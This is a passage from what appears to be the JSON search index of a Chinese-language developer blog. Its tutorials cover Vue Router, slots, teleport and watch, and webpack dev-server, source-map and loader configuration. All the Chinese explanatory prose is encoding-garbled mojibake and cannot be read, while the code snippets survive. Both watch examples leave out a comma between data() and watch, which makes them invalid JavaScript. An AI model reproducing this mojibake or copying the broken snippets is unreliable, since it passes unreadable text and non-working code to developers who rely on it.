æ¯ä¸€å€‹è·¯ç”±ï¼Œå°±æœƒç”¨ã€Œå‹•æ…‹ã€çš„æ–¹å¼ä¾†æ’°å¯«ã€‚ åœ¨ Vue å¯«çš„æ–¹å¼æ˜¯é€™æ¨£ï¼š 123456789101112const routes = [ { path: '/products', name: 'ProductList', component: ProductList }, { path: '/jobs/:id', name: 'ProductDetail', // ç”¨ : ä¾†è¡¨ç¤º component: ProductDetail }] æ‰€ä»¥é€™å€‹ :id å°±æœƒæ˜¯å‹•æ…‹çš„å€¼ï¼Œå¦‚æœæˆ‘åˆ° /job/A çš„è©± :id å°±æœƒæ˜¯ Aï¼Œjob/B å°±æœƒæ˜¯ Bï¼Œä»¥æ­¤é¡æ¨ã€‚ å–å¾—åƒæ•¸å€¼æœ‰äº†å‹•æ…‹åƒæ•¸ä»¥å¾Œé€šå¸¸æœƒéœ€è¦åœ¨å°æ‡‰è·¯ç”±çš„å…ƒä»¶ï¼ˆProductDetailï¼‰ä¾†é€éä»–ä¾†æ‰“ API ä¹‹é¡çš„ï¼Œæ‰€ä»¥é€™é‚Šä»‹ç´¹ä¸€ä¸‹æ€éº¼å–å¾—åƒæ•¸å€¼ï¼š 12345678910111213141516&lt;template&gt; &lt;div&gt; &lt;h2&gt;Job Detail&lt;/h2&gt; &lt;!-- å–å¾—åƒæ•¸å€¼ --&gt; &lt;p&gt;Job detail: {{ $route.params.id }}&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { created() { // å–å¾—åƒæ•¸å€¼ console.log('id', this.$route.params.id) } }&lt;/script&gt; $route æ˜¯ä¸€å€‹ç‰©ä»¶ï¼Œè£¡é¢æœƒæ”¾è »å¤šè·Ÿè·¯ç”±æœ‰é—œçš„è³‡è¨Šï¼Œä¸éé€™é‚Šä¸»è¦æœƒç”¨åˆ°çš„æ˜¯ paramsï¼Œä»£è¡¨å‹•æ…‹åƒæ•¸ã€‚ é™¤äº†é€é $route ä»¥å¤–é‚„æœ‰ä¸€ç¨®æ¯”è¼ƒç‰¹åˆ¥çš„æ–¹æ³•ï¼Œå°±æ˜¯é€é propsï¼š 123456789101112&lt;template&gt; &lt;div&gt; &lt;h2&gt;Job Detail&lt;/h2&gt; &lt;p&gt;Job detail: {{ id }}&lt;/p&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt; export default { props: ['id'] }&lt;/script&gt; è¦æ€éº¼æ‹¿åˆ°é€™å€‹ propsï¼Ÿå¾ˆç°¡å–®ï¼Œåªè¦åˆ° router.js é–‹å•Ÿé€™åŠŸèƒ½å°±å¥½ï¼š 12345678const routes = [ { path: '/jobs/:id', name: 'JobDetail', component: JobDetail, props: true // å•Ÿç”¨ props åŠŸèƒ½ }] æ‰‹å‹•åˆ‡æ›è·¯ç”±é™¤äº†ç”¨ &lt;router-link&gt; ä»¥å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨æ‰‹å‹•çš„æ–¹å¼ä¾†åˆ‡æ›è·¯ç”±ï¼ŒæŠ€è¡“ä¸Šä¾†èªªå«åšã€ŒProgrammatic Navigationã€ï¼š 12345678910111213&lt;template&gt; &lt;h2&gt;Product List&lt;/h2&gt; &lt;div v-for=\"product of products\" :key=\"product.id\"&gt; &lt;h3 @click=\"$router.push({ name: 'ProductsDetail', params: { id: product.id } })\" &gt; {{ product.title }} &lt;/h3&gt; &lt;/div&gt;&lt;/template&gt; å¦‚æœä½ è¦ºå¾—é€™æ¨£å­çœ‹èµ·ä¾†å¾ˆéº»ç…©çš„è©±ä¹Ÿå¯ä»¥å¯«æˆé€™æ¨£å­ï¼š 123456&lt;template&gt; &lt;h2&gt;Product List&lt;/h2&gt; &lt;div v-for=\"product of products\" :key=\"product.id\"&gt; &lt;h3 @click=\"$router.push(`/products/${product.id}`)\"&gt;{{ product.title }}&lt;/h3&gt; &lt;/div&gt;&lt;/template&gt; æ›´å¤šçš„å¯«æ³•å¯ä»¥åƒè€ƒé€™è£¡ é‡æ–°å°å‘é€™é‚Šç›´æ¥çœ‹ code å§ï¼š 12345678910111213const routes = [ // å‡è¨­é€™æ˜¯æ–°çš„ { path: '/jobs', name: 'JobList', component: JobList }, // å‡è¨­é€™æ˜¯èˆŠçš„ { path: '/all-jobs', redirect: 'jobs' }] ç‚ºäº†æŠŠèˆŠçš„ç¶²å€éƒ½å°å‘åˆ°æ–°çš„ä½ç½®ï¼Œæˆ‘å€‘å¯ä»¥åƒä¸Šé¢é€™æ¨£å­ä¾†é‡æ–°å°å‘ã€‚ 404 é é¢Vue çš„å¯«æ³•æ¯”è¼ƒç‰¹åˆ¥ä¸€é»ï¼Œè¦é€é params æ­é…æ­£å‰‡è¡¨é”å¼çš„æ–¹å¼ä¾†åšï¼Œåƒé€™æ¨£ï¼š 1234567const routes = [ { path: '/:catchAll(.*)', name: 'NotFound', component: NotFound }] è£¡é¢çš„ catchAll æ˜¯è‡ªè¨‚åç¨±ï¼Œä½ å–œæ­¡çš„è©±ä¹Ÿå¯ä»¥å« abcã€‚ç¸½ä¹‹é‡é»åœ¨æ–¼ () ä¸­çš„æ­£å‰‡è¡¨é”å¼ï¼Œåªè¦ç¬¦åˆæ¢ä»¶å°±æœƒé€²åˆ°é€™å€‹è·¯ç”±ã€‚ å°é™·é˜±ï¼åœ¨ä¸åŒè·¯ä¸Šä½¿ç”¨åŒçš„å…ƒä»¶é€™æ˜¯æˆ‘è‡ªå·±å¯¦ä½œæ™‚è¸©åˆ°çš„é›·ï¼Œå…ˆä¾†çœ‹çœ‹ç•¶æ™‚çš„æƒ…å¢ƒï¼š 123456789101112131415161718const routes = [ { path: '/', name: 'home', component: Home }, { path: '/add-new-project', name: 'AddProject', component: Form // å…±ç”¨å…ƒä»¶ }, { path: '/project/:id', name: 'EditProject', component: Form, // å…±ç”¨å…ƒä»¶ props: true }] ä¹‹æ‰€ä»¥æœƒå…±ç”¨åŒä¸€å€‹ Form æ˜¯å› ç‚ºé€™å…©å€‹åªå·®åœ¨ï¼š è¡¨å–®çš„åˆå§‹å€¼ æäº¤è¡¨å–®æ™‚è¦æ›´æ–°è³‡æ–™ or å»ºç«‹è³‡æ–™ å¯æ˜¯ç•¶æ™‚å°±é‡åˆ°äº†é€™æ¨£çš„ç‹€æ³ï¼š æ˜æ˜å°±åˆ‡æ›åˆ°ä¸åŒçš„è·¯ç”±ä¸Šäº†ï¼Œä½†å…§å®¹å»è¢«ç·©å­˜äº†ä¸‹ä¾†ï¼Œç”šè‡³æ ¹æœ¬æ²’æœ‰è¢« unmountï¼ˆè‡ªå·±ç”¨ç”Ÿå‘½é€±æœŸ hook å¯¦æ¸¬çš„çµæœï¼‰ã€‚ ä¸éåœ¨ Vue è£¡é¢é€™æ˜¯æ­£å¸¸çš„ç¾è±¡ï¼ŒAKAã€Œç¯€èƒ½æ©Ÿåˆ¶ã€ã€‚ç°¡å–®ä¾†èªªå°±æ˜¯ Vue æœƒç›¡å¯èƒ½æŠŠèƒ½é‡è¤‡åˆ©ç”¨çš„æ±è¥¿ç•™ä¸‹ä¾†ç”¨çš„é—œä¿‚ã€‚ è¦è§£æ±ºé€™å€‹è¾¦æ³•çš„ä½œæ³•å°±æ˜¯åŠ ä¸Š keyï¼Œè‡³æ–¼è¦åŠ åœ¨å“ªï¼Ÿä»¥æˆ‘å€‘é€™é‚Šçš„å•é¡Œä¾†èªªæ˜¯å‡ºç¾åœ¨ã€Œè·¯ç”±é¡¯ç¤ºä¸Šã€ï¼Œæ‰€ä»¥å¾ˆç›´è¦ºçš„å°±æœƒåŠ åœ¨é€™è£¡ï¼š 1&lt;router-view :key=\"$route.path\" /&gt; åªè¦è®“æ¯ä¸€å€‹è·¯ç”±éƒ½æœ‰å”¯ä¸€çš„ keyï¼ŒVue å°±æœƒç›´æ¥è¦–ç‚ºæ˜¯ä¸åŒçš„æ±è¥¿ï¼Œå¼·åˆ¶é‡æ–°æ¸²æŸ“ï¼Œå°±èƒ½è§£æ±ºé€™å€‹å•é¡Œäº†ã€‚ è©³ç´°å¯ä»¥åƒè€ƒé€™ç¯‡ã€‚","link":"/2022/08/09/vue-router/"},{"title":"Vueï¼æˆ‘æƒ³æ”¾çš„æ˜¯å…§å®¹ä¸æ˜¯è³‡æ–™ï¼ˆSlotï¼‰","text":"å¯«å…ƒä»¶æ™‚æœƒç”¨åˆ°ã€‚ é€™å€‹å°±è·Ÿ React çš„ã€ŒChildrenã€æ˜¯å·®ä¸å¤šçš„æ±è¥¿ï¼Œè®“æˆ‘å€‘å¯ä»¥ç›´æ¥æŠŠ template å‚³çµ¦å…ƒä»¶ä½¿ç”¨ï¼Œåªæ˜¯åœ¨ Vue è£¡é¢å«ä½œã€ŒSlotã€ï¼Œè€Œä¸”åŠŸèƒ½ä¹Ÿæ›´å¤šä¸€äº›ã€‚ App.vueï¼š 1234567891011121314151617&lt;template&gt; &lt;div class=\"container\"&gt; &lt;div class=\"block\"&gt; &lt;button class=\"btn\" @click=\"onOpen\"&gt;Show modal&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;Modal v-show=\"isModal\" :isSale=\"isSale\" @onClose=\"onClose\"&gt; &lt;!-- basic slot --&gt; &lt;h1&gt;PeaNu&lt;/h1&gt; &lt;p&gt;peanu@peanu.dev&lt;/p&gt; &lt;!-- naming slot --&gt; &lt;template v-slot:actions&gt; &lt;button class=\"btn\"&gt;Add Friend&lt;/button&gt; &lt;button class=\"btn\"&gt;Block User&lt;/button&gt; &lt;/template&gt; &lt;/Modal&gt;&lt;/template&gt; ä¸Šé¢æ˜¯æŠŠå…§å®¹å¯«å…¥ Modal çš„ slot ä¸­ï¼ŒVue æ¯”è¼ƒç‰¹åˆ¥çš„åœ°æ–¹æ˜¯é‚„å¯ä»¥å¹« slot å‘½åï¼Œä½¿ç”¨æ–¹å¼æ˜¯é€é &lt;template&gt; å’Œ v-slot:åç¨± ä¾†å®šç¾©ï¼Œæ¥è‘—åœ¨å…ƒä»¶ä¸­å°±å¯ä»¥é€éåç¨±ä¾†åšå€éš”ã€‚ Modal.vueï¼š 1234567891011121314&lt;template&gt; &lt;div class=\"backdrop\" @click.self=\"onClick\"&gt; &lt;div class=\"modal\" :class=\"{ sale: isSale }\"&gt; &lt;div class=\"content\"&gt; &lt;!-- basic slot --&gt; &lt;slot&gt;default content&lt;/slot&gt; &lt;div class=\"action\"&gt; &lt;!-- naming slot --&gt; &lt;slot name=\"actions\"&gt;deafault content&lt;/slot&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/template&gt; é™„è¨»ï¼šdefault content çš„æ„æ€æ˜¯é è¨­å…§å®¹ï¼Œæœƒåœ¨æ²’æœ‰å‚³å…¥ slot æ™‚é¡¯ç¤º åœ¨å…ƒä»¶ä¸­è¦æ¥æ”¶ slot æœƒç›´æ¥é€é &lt;slot&gt; ä¾†æ¥ï¼Œå¦‚æœæ˜¯å‘½å slot çš„è©±å°±å†åŠ ä¸Š name å±¬æ€§ä¾†å€éš”é–‹ä¾†å°±è¡Œäº†ã€‚ æƒ³çŸ¥é“æ›´å¤šç´°ç¯€çš„è©±å¯ä»¥åˆ° é€™è£¡ çœ‹ç¯„ä¾‹æœƒæ¯”è¼ƒå¿«ã€‚ é †é“ä¸€æã€Œå‘½å slotã€æœ‰æä¾›èªæ³•ç³–ï¼Œå¯ä»¥ç”¨ #name çš„æ–¹å¼ä¾†è¡¨ç¤ºï¼š 12345678910111213141516&lt;template&gt; &lt;div class=\"container\"&gt; &lt;div class=\"block\"&gt; &lt;button class=\"btn\" @click=\"onOpen\"&gt;Show modal&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;Modal v-show=\"isModal\" :isSale=\"isSale\" @onClose=\"onClose\"&gt; &lt;h1&gt;PeaNu&lt;/h1&gt; &lt;p&gt;peanu@peanu.dev&lt;/p&gt; &lt;!-- ç”¨ # ä¾†è¡¨ç¤º --&gt; &lt;template #actions&gt; &lt;button class=\"btn\"&gt;Add Friend&lt;/button&gt; &lt;button class=\"btn\"&gt;Block User&lt;/button&gt; &lt;/template&gt; &lt;/Modal&gt;&lt;/template&gt;","link":"/2022/08/04/vue-slot/"},{"title":"Vueï¼çª©æƒ³æ”¾åˆ°å…¶ä»–ä½ç½®å¯ä»¥å—ï¼Ÿï¼ˆTeleportï¼‰","text":"é›–ç„¶é‚„æ²’å¯¦éš›ç”¨éï¼Œä½†é‚„æ˜¯èƒ½äº†è§£ä¸€ä¸‹ã€‚ é€™å€‹è·Ÿ Reactï¼ç”¨ portal æŠŠå…ƒä»¶ç§»åˆ°æˆ‘æƒ³è¦çš„ä½ç½® åœ¨åšçš„äº‹æƒ…æ˜¯ä¸€æ¨£çš„ï¼Œå°±æ˜¯è‡ªå·±æ±ºå®šã€Œå…ƒä»¶çš„æ¸²æŸ“ä½ç½®ã€ï¼š 123456789101112131415161718&lt;template&gt; &lt;div class=\"container\"&gt; &lt;div class=\"block\"&gt; &lt;button class=\"btn\" @click=\"onOpenUser\"&gt;Show user&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- æ’åˆ° body ä¸­ --&gt; &lt;teleport to=\"body\"&gt; &lt;Modal v-if=\"isUserModal\" @onClose=\"onUserClose\"&gt; &lt;h1&gt;PeaNu&lt;/h1&gt; &lt;p&gt;peanu@peanu.dev&lt;/p&gt; &lt;template v-slot:actions&gt; &lt;button class=\"btn\"&gt;Add Friend&lt;/button&gt; &lt;button class=\"btn\"&gt;Block User&lt;/button&gt; &lt;/template&gt; &lt;/Modal&gt; &lt;/teleport&gt;&lt;/template&gt; &lt;teleport to=\"...\"&gt; çš„å…§å®¹æ˜¯ã€ŒCSS selectorã€ï¼Œæ‰€ä»¥ä½ ä¹Ÿå¯ä»¥å¡«å…¥ #body æˆ– .body ä¹‹é¡çš„æ±è¥¿ï¼Œç¸½ä¹‹åªè¦æ˜¯åˆæ³•çš„å°±å¥½äº†ã€‚","link":"/2022/08/05/vue-teleport/"},{"title":"Vueï¼ç›£è½ç‰¹å®šçš„å€¼ï¼ˆwatchï¼‰","text":"Iâ€™ll be wating you. ç°¡è¿°æœ‰æ™‚å€™ä½ å¯èƒ½æœƒæƒ³è¦åœ¨ data æ”¹è®Šæ™‚åšä¸€äº›äº‹æƒ…ï¼Œä¾‹å¦‚èªªä¸€å€‹ Todo-list æ›´æ–°çš„æ™‚å€™å¯èƒ½æƒ³åŒæ­¥æ›´æ–°åˆ° localStorage ä¸­ã€‚ é›–ç„¶å¯ä»¥é€é beforeUpdate ä¾†è™•ç†ï¼Œä¸éè¦çŸ¥é“å®ƒçš„ç‰¹æ€§æ˜¯ã€Œä»»ä½•ç•«é¢ä¸Šçš„è³‡æ–™æ›´æ–°æ™‚éƒ½æœƒè§¸ç™¼ã€ï¼Œé€™æ¨£å°±æœ‰å¯èƒ½åšäº†ç„¡æ„ç¾©çš„æ›´æ–°ï¼Œæ‰€ä»¥æ‰éœ€è¦ç”¨ watch ä¾†ã€Œç›£è½æŸä¸€å€‹å€¼ã€ã€‚ æˆ‘è¦ºå¾—é€™å°±è·Ÿ React è£¡ useEffect çš„ dependencies array é‚„è »ç›¸ä¼¼çš„ï¼Œç¸½ä¹‹å®ƒçš„ç”¨æ³•æ˜¯é€™æ¨£ï¼š 123456789101112131415161718export default { data() { return { todos: [], } } watch: { // ç›£è½ todos é€™å€‹é™£åˆ— todos: { // todos æ”¹è®Šæ™‚çš„ handler handler(current, prev) { localStorage.setItem('projects', JSON.stringify(current)) }, // deep comparing deep: true } }} é™„è¨»ï¼šhandler æ˜¯ config çš„ keyï¼Œæ‰€ä»¥ä¸èƒ½äº‚æ”¹åã€‚ é€™é‚Šçš„å¯«æ³•æ˜¯å±¬æ–¼æœ‰é¡å¤– config çš„å¯«æ³•ï¼Œå› ç‚ºæˆ‘å€‘æƒ³ç›£è½ã€Œæ•´å€‹ toodsã€çš„å…§å®¹ï¼Œè€Œ todos é¡¯ç„¶æ˜¯ä¸€å€‹ reference typeï¼Œæ‰€ä»¥å¿…é ˆè®“ä»–ç”¨ deep æ¨¡å¼ä¾†æ¯”å°ï¼Œå¦å‰‡é è¨­åªæœƒç”¨ shallow ä¾†åšã€‚ å¦‚æœä½ æƒ³ç›£è½çš„å€¼æ˜¯å–®ç´”çš„ primitive typeï¼Œé‚£å¯ä»¥ç°¡åŒ–æˆé€™æ¨£ï¼š 1234567891011121314export default { data() { return { todos: [], filter: 'all' } } watch: { // ç›£è½ filter é€™å€‹å­—ä¸² filter() { // do something when filter is changed } }} æƒ³çŸ¥é“æ›´å¤šç”¨æ³•å¯ä»¥åƒè€ƒå®˜æ–¹æ–‡ä»¶ã€‚","link":"/2022/08/07/vue-watch/"},{"title":"webpack é–‹ç™¼æ™‚çš„ä¸€äº›è¨­å®š","text":"ç­†è¨˜ç­†è¨˜ï¼ é–‹å•Ÿ dev-serveræ¯æ¬¡éƒ½è¦ npm run build æ‰èƒ½çœ‹åˆ°çµæœçš„è©±å¤ªéº»ç…©äº†ï¼Œæ‰€ä»¥èƒ½ç”¨ webpack æä¾›çš„ dev severï¼Œå¯¦ç¾è‡ªå‹•é‡æ–°ç·¨è­¯çš„åŠŸèƒ½ã€‚ é¦–å…ˆåƒè€ƒ å®˜æ–¹èªªæ˜ï¼š å®‰è£ 1npm install --save-dev webpack-dev-server è¨­å®š config 123456module.exports = { devServer: { // æ‰“åŒ…å¾Œçš„æª”æ¡ˆä½ç½® static: './dist' }} æ‰“é–‹ dev server 1npx webpack serve --open å°±æ˜¯é€™éº¼ç°¡å–®å›‰ï¼ é–‹å•Ÿ source mapsource map çš„ç”¨é€”æ˜¯è®“ä½ æ¯”è¼ƒå¥½ debugã€‚ æ‹¿ä¸€æ®µ code ä¾†èˆ‰ä¾‹ï¼š 123456789101112131415// æ¨£å¼const css = require('./style.scss')// éš¨ä¾¿å¯«çš„æ¨¡çµ„import { add } from './utils'const a = [1, 2, 3]const b = [...a]for (let c of b) { // è·‘åˆ°ç¬¬äºŒåœˆæ™‚ä¸Ÿä¸€å€‹ error if (c === 2) { throw new Error('hahaha') } console.log(c)} é€™æ™‚å€™å¦‚æœè¦çœ‹ code å°±æœƒç™¼ç¾æ‘»äº†ä¸€å † webpack çš„æ±è¥¿ï¼š é€™æ˜¯å› ç‚ºåœ¨è·‘çš„æ™‚å€™æ˜¯åŸ·è¡Œ bundle å¾Œçš„æª”æ¡ˆï¼Œæ‰€ä»¥é€™è£¡çš„ç¨‹å¼ç¢¼ä¹Ÿç•¶ç„¶æ˜¯æ‰“åŒ…å¾Œçš„ã€‚ æ‰€ä»¥ï¼Œç‚ºäº†è®“ debug æ™‚èƒ½å¤ çœ‹ srcï¼ˆä¹Ÿå°±æ˜¯æ‰“åŒ…å‰ï¼‰çš„ç¨‹å¼ç¢¼ï¼Œå¯ä»¥åˆ° config è£¡é¢åŠ ä¸Šé€™è¡Œï¼š 123module.exports = { devtool: 'inline-source-map'} æœ‰äº† source map ä»¥å¾Œå°±æœƒè‡ªå‹•æŠŠ bundle è·Ÿ src çµ¦å°æ‡‰èµ·ä¾†ï¼Œæ‰€ä»¥å°±èƒ½çœ‹åˆ°æ­£å¸¸çš„ code äº†ï¼š","link":"/2022/03/01/webpack-development-tips/"},{"title":"èªè­˜ webpack","text":"å‰ç«¯æœ€å¼·æ‰“åŒ…å·¥å…·ã€‚ ç‚ºä»€éº¼è¦ç”¨ webpackï¼Ÿæˆ‘è¦ºå¾—æœ€ä¸»è¦çš„åŸå› æœ‰å…©é»ï¼š å…¨åŸŸè®Šæ•¸çš„è¡çª å¸Œæœ›åœ¨ç€è¦½å™¨ä¸Šå¼•å…¥ npm ä¸‹è¼‰çš„å¥—ä»¶ éå»åœ¨ç€è¦½å™¨ä¸Šå¼•å…¥å¥—ä»¶æ™‚ï¼Œé€šå¸¸æ˜¯ï¼š 12345&lt;!-- jQuery --&gt;&lt;script src=\"https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js\"&gt;&lt;/script&gt;&lt;script&gt; // æ¥è‘—åœ¨é€™è£¡å°±èƒ½ç”¨ $ æˆ– jQuery ä¾†ä½¿ç”¨&lt;/script&gt; src æ˜¯æœ€ç°¡å–®çš„æ–¹æ³•ï¼Œä¸éç¾åœ¨å…¨åŸŸç©ºé–“ä¸­å°±æœ‰ $ å’Œ jQuery é€™å…©å€‹è®Šæ•¸ã€‚ å•é¡Œä¾†äº†ï¼Œå¦‚æœä»Šå¤©æœ‰å¦ä¸€å€‹å¥—ä»¶ä¹Ÿç”¨ $ ä¾†å‘½åæ€éº¼è¾¦ï¼Ÿé€™å€‹å°±æ˜¯å…¨åŸŸè®Šæ•¸çš„å‘½åè¡çªã€‚ ä½†å¦‚æœæ˜¯ Node.js çš„è©±å°±æ²’æœ‰é€™å€‹å•é¡Œï¼Œå› ç‚ºæˆ‘å€‘å¯ä»¥é€™æ¨£åšï¼š 12// è‡ªå·±å‘½åconst $ = require('jquery') æ‰€ä»¥å¾Œä¾† ES6 æ¨å‡ºäº†ã€ŒES Modulesã€ï¼Œè®“ç€è¦½å™¨èƒ½å¤ æœ‰åŸç”Ÿçš„ã€Œæ¨¡çµ„æ©Ÿåˆ¶ã€ã€‚ ä½†é‚„æ˜¯æœ‰ä¸€äº›å•é¡Œï¼š ä¸æ˜¯æ‰€æœ‰ç€è¦½å™¨éƒ½èƒ½æ”¯æ´ ä½¿ç”¨ä¸Šè »éº»ç…©çš„ï¼ˆè¦åŠ ä¸Š type=module å’Œæ­é… server åŸ·è¡Œæ‰èƒ½ä½¿ç”¨ï¼‰ ä¾ç„¶æ²’è¾¦æ³•ç”¨æŠŠ node_modules è£¡çš„æ±è¥¿å¼•å…¥é€²ä¾†ç”¨ æ°¸é è¨˜å¾—ä¸€å¥è©±ï¼š ç€è¦½å™¨ä¸æ”¯æ´æˆ–æ”¯æ´åº¦å¾ˆå·®çš„è©±ï¼Œå°±è‡ªå·±å¯«ä¸€å€‹å·¥å…·ä¾†è®“å®ƒæ”¯æ´å°±å¥½äº†ã€‚ æ‰€ä»¥ç‚ºäº†è§£æ±ºä»¥ä¸Šå•é¡Œï¼Œwebpack å°±èª•ç”Ÿäº†ã€‚ å¦‚æœæˆ‘æƒ³è¦å¼•å…¥ç”¨ npm ä¸‹è¼‰çš„ jqueryï¼Œæˆ‘å¯ä»¥é–‹ä¸€æ”¯æª”æ¡ˆä¾†å¯« jQueryï¼š 123456789// CommonJSconst myjQuery = require('jquery')myjQuery('body').css('background-color', 'rgba(0, 255, 0, 0.2)')myjQuery('.btn').on('click', () =&gt; console.log('click'))// ES modulesimport jq from 'jquery'jq('body').css('background-color', 'rgba(0, 0, 255, 0.2)')jq('.btn').on('click', () =&gt; console.log('click')) ä¸ç®¡æˆ‘è¦åœ¨è£¡é¢ç”¨ CommonJS æˆ– ES modules ä¾†å¼•å…¥éƒ½æ²’å•é¡Œã€‚æˆ‘åªè¦è¨˜å¾—å¯«å¥½å¾Œç”¨ webpack æ‰“åŒ…ï¼Œæ¥è‘—åœ¨ HTML è£¡é¢åŠ ä¸Šä¸€å¥ï¼š 12&lt;!-- æ‰“åŒ…å¥½çš„æ¨¡çµ„ --&gt;&lt;script src=\"./bundle.js\"&gt;&lt;/script&gt; ä¸€åˆ‡å°±å®Œæˆäº†ï¼Œè€Œä¸”é‚„çœŸçš„å¯ä»¥è·‘ï¼Œå¾ˆç¥å¥‡å§ï¼Ÿä½†ä¸è¦å¿˜äº†ï¼Œé€™ä¸€åˆ‡éƒ½æ˜¯å› ç‚ºæœ‰ webpack å¹«ä½ åœ¨èƒŒå¾Œåšè™•ç†ï¼Œå¦å‰‡ç€è¦½å™¨ä¸å¯èƒ½åšå¾—åˆ°é€™äº›ã€‚ è‡³æ–¼ç‚ºä»€éº¼ webpack å¯ä»¥åšåˆ°ï¼Ÿä½ å¯ä»¥æƒ³æˆæ˜¯ã€Œwebpack ç›´æ¥å¹«ä½ åœ¨ç€è¦½å™¨ä¸Šå¯¦ä½œ require æˆ– import é€™å…©å€‹å‡½å¼ã€ï¼Œå¤§æ¦‚æ˜¯é€™æ¨£ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œå†æ¬¡å¼·èª¿ï¼š webpack æ˜¯ç”¨ä¾†æŠŠæ¨¡çµ„æ‰“åŒ…èµ·ä¾†çš„å·¥å…· webpack æ˜¯ç”¨ä¾†æŠŠæ¨¡çµ„æ‰“åŒ…èµ·ä¾†çš„å·¥å…· webpack æ˜¯ç”¨ä¾†æŠŠæ¨¡çµ„æ‰“åŒ…èµ·ä¾†çš„å·¥å…· è£œå……ï¼å¼•å…¥æ™‚æ˜¯æ€éº¼å¾ npm è£¡é¢æ‰¾åˆ°çš„ï¼Ÿå…¶å¯¦æ²’æœ‰ä»€éº¼é»‘é­”æ³•ï¼Œä»¥ jQuery çš„ä¾‹å­ä¾†èªªï¼Œä½ å¯ä»¥åœ¨ node_modules è£¡æ‰¾åˆ° jqueryï¼Œè³‡æ–™å¤¾çµæ§‹å¤§æ¦‚æ˜¯é€™æ¨£ï¼š 1234567891011121314151617â”‚ AUTHORS.txtâ”‚ bower.jsonâ”‚ LICENSE.txtâ”‚ package.jsonâ”‚ README.mdâ”‚â”œâ”€â”€â”€distâ”‚ jquery.jsâ”‚ jquery.min.jsâ”‚ jquery.min.mapâ”‚ jquery.slim.jsâ”‚ jquery.slim.min.jsâ”‚ jquery.slim.min.mapâ”‚â”œâ”€â”€â”€externalâ”‚â””â”€â”€â”€src æ¥è‘—æ‰“é–‹ package.json æœå°‹ main æœƒçœ‹åˆ°ï¼š 123{ \"main\": \"dist/jquery.js\"} æ‰€ä»¥é€™å°±æ˜¯è¢«å¼•å…¥é€²ä¾†çš„ jQueryã€‚å…¶ä»–å¥—ä»¶ä¹Ÿæ˜¯é€™æ¨£é‹ä½œçš„ï¼ŒçœŸçš„æ²’æœ‰ä»€éº¼é»‘é­”æ³•ï¼Œåªæ˜¯é€™æ¨£è€Œå·²ã€‚ webpack.config åŸºæœ¬çµæ§‹config æ˜¯ç”¨ä¾†è¨­å®š webpack è¦æ€éº¼æ‰“åŒ…ï¼Œæˆ–æ˜¯ä¸€äº›é¡å¤–è³‡è¨Šï¼Œé€™é‚Šå…ˆå¯«å€‹æœ€ç°¡å–®çš„æ¶æ§‹ï¼š 123456789101112module.exports = { // é€²å…¥é»ï¼Œç°¡å–®ä¾†èªªå°±æ˜¯å¼•å…¥æ‰€æœ‰ module çš„é‚£æ”¯æª”æ¡ˆ entry: './src/main.js', // development æˆ– productionï¼ˆé è¨­ï¼‰ mode: 'production', output: { // è¼¸å‡ºä½ç½® path: __dirname, // æª”æ¡ˆåç¨± filename: 'bundle.js' }} èªè­˜ loaderwebpack å¼·å¤§çš„åœ°æ–¹åœ¨æ–¼å®ƒä¸åªæŠŠ JavaScript ç•¶ä½œæ¨¡çµ„ï¼Œç”šè‡³èƒ½æŠŠåœ–ç‰‡ã€CSS ç­‰è³‡æºéƒ½ç•¶æˆæ˜¯æ¨¡çµ„ã€‚ ç‚ºäº†å¯¦ç¾é€™å€‹åŠŸèƒ½ï¼Œå¿…é ˆè¦æœ‰ä¸€å€‹æ±è¥¿ä¾†è™•ç†ï¼Œé‚£å€‹æ±è¥¿å°±æ˜¯ã€Œloaderã€ã€‚ ç°¡å–®ä¾†èªªå°±æ˜¯æŠŠã€Œè³‡æºã€è¼‰å…¥æˆã€Œç€è¦½å™¨çœ‹çš„æ‡‚çš„æ±è¥¿ã€ï¼Œé€™å°±æ˜¯ loader çš„è² è²¬çš„å·¥ä½œã€‚ é€™é‚Šåšå€‹ç¤ºç¯„ï¼Œå‡è¨­æˆ‘æƒ³è¦åœ¨ JavaScript è£¡é¢è¼‰å…¥ CSSï¼š 123// å…©ç¨®éƒ½å¯ä»¥import css from './style.css'const css = require('./style.css') ç‚ºäº†è¼‰å…¥ CSSï¼Œæˆ‘éœ€è¦å…©å€‹ loaderï¼š css-loader è§£æ CSS å…§å®¹ style-loader æŠŠ CSS æ’å…¥ DOM æ¥è‘—åˆ° config è£¡é¢è¨­å®š ruleï¼š 1234567891011121314151617181920module.exports = { entry: './src/main.js', mode: 'development', output: { path: __dirname, filename: 'bundle.js' }, // åœ¨é€™è£¡è¨­å®š module: { rules: [ { // æ‰€æœ‰ .css çµå°¾çš„æª”æ¡ˆ test: /\\.css$/i, // æ³¨æ„é †åºæ˜¯ã€Œç”±å¾Œå¾€å‰ã€ï¼Œ // å…ˆåŸ·è¡Œ css-loader å†åŸ·è¡Œ style.loader use: ['style-loader', 'css-loader'] } ] }} æ¥è‘—ä¸€æ¨£ npm run build æ‰“åŒ…ï¼Œå†è¼‰å…¥ bundle.js å°±å®Œæˆäº†ã€‚ ç¸½ä¹‹å‘¢ï¼ŒåŸºæœ¬è¦å‰‡éƒ½æ˜¯é€™æ¨£ï¼š æ‰¾å‡ºå¯ä»¥è§£æé‚£å€‹æª”æ¡ˆæ ¼å¼çš„ loader è¨­å®š config ä¸­çš„ rules æ‰“åŒ… æ‰€ä»¥è¦è¼‰å…¥ scss çš„ config å°±æœƒé€™æ¨£å¯«ï¼š 1234567891011121314151617181920212223module.exports = { entry: './src/main.js', mode: 'development', output: { path: __dirname, filename: 'bundle.js' }, module: { rules: [ { // æ‰€æœ‰ .sass å’Œ .scss çµå°¾çš„æª”æ¡ˆ test: /\\.s[ac]ss$/i, /* ç”±å¾Œå¾€å‰åŸ·è¡Œï¼š 1. sass-loader 2. css-loader 3. style-loader */ use: ['style-loader', 'css-loader', 'sass-loader'] } ] }} èªè­˜ plug-inwebpack æœ¬èº«ä¹Ÿæœ‰ä¸€äº›èƒ½ç”¨çš„ plug-inï¼Œé€™é‚Šæ‹¿ 